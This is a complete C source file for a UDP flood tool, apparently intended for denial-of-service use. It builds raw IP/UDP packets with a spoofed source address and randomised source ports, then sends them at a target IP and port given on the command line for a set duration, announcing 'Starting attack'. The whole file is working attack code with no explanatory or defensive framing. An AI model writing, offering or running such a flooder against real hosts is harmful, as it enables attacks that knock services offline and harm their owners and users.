#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>

unsigned short checksum(void *b, int len)
{
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void flood(char *target_ip, int target_port, int duration)
{
    int sock;
    struct sockaddr_in target;
    char packet[1024];
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    int packet_size;
    time_t start_time;
    int count = 0;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0)
    {
        printf("Failed to create socket\n");
        exit(1);
    }

    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip);

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    {
        printf("Failed to set socket option\n");
        exit(1);
    }

    memset(packet, 0, sizeof(packet));

    srand(time(NULL));

    start_time = time(NULL);

    while (time(NULL) - start_time < duration)
    {
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 64;
        ip->id = rand() % 65535;
        ip->frag_off = 0;
        ip->ttl = 255;
        ip->protocol = IPPROTO_UDP;
        ip->check = 0;
        ip->saddr = inet_addr("192.168.1.1");
        ip->daddr = target.sin_addr.s_addr;

        udp->source = htons(rand() % 65535);
        udp->dest = htons(target_port);
        udp->len = htons(sizeof(struct udphdr) + 64);

        memset(data, 'A', 64);

        ip->check = checksum((unsigned short *)packet, ip->tot_len);

        packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + 64;

        if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&target, sizeof(target)) < 0)
        {
            printf("Failed to send packet\n");
        }
        else
        {
            count++;
        }
    }

    printf("Sent %d packets to %s:%d\n", count, target_ip, target_port);
    close(sock);
}

int main(int argc, char *argv[])
{
    if (argc != 4)
    {
        printf("Usage: %s <target_ip> <target_port> <duration_seconds>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    printf("Starting attack on %s:%d for %d seconds\n", target_ip, target_port, duration);

    flood(target_ip, target_port, duration);

    return 0;
}
